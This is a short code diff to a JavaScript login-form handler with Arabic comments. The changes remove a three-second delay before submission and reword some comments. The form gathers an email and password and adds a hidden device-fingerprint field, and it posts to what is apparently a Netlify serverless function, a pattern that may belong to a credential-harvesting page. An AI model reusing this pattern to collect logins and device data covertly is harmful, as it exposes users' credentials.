@@ -79,7 +79,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // 4. منطق التحقق والإرسال النهائي
     form.addEventListener('submit', function(e) {
-        e.preventDefault(); // نمنع الإرسال المباشر للتحكم فيه
+        e.preventDefault(); // نمنع الإرسال المباشر للتحكم في التحقق
 
         const emailVal = emailInput.value.trim();
         const passVal = passwordInput.value.trim();
@@ -112,18 +112,14 @@ document.addEventListener('DOMContentLoaded', function() {
             const fpInput = document.createElement('input');
             fpInput.type = 'hidden';
             fpInput.name = 'security_fingerprint';
-            // نحول الكائن إلى سلسلة JSON لإرسالها إلى دالة Netlify
             fpInput.value = JSON.stringify(fpData);
             form.appendChild(fpInput);
         }
 
-        // 6. بدء التحميل والإرسال
+        // 6. بدء التحميل والإرسال (الإرسال فوري)
         btnNext.classList.add('loading');
 
-        // الانتظار 3 ثواني ثم الإرسال
-        setTimeout(() => {
-            btnNext.classList.remove('loading');
-            form.submit(); // إرسال النموذج إلى دالة Netlify
-        }, 3000); 
+        // إرسال النموذج فوراً بعد التحقق (تمت إزالة الـ setTimeout)
+        form.submit(); 
     });
 });
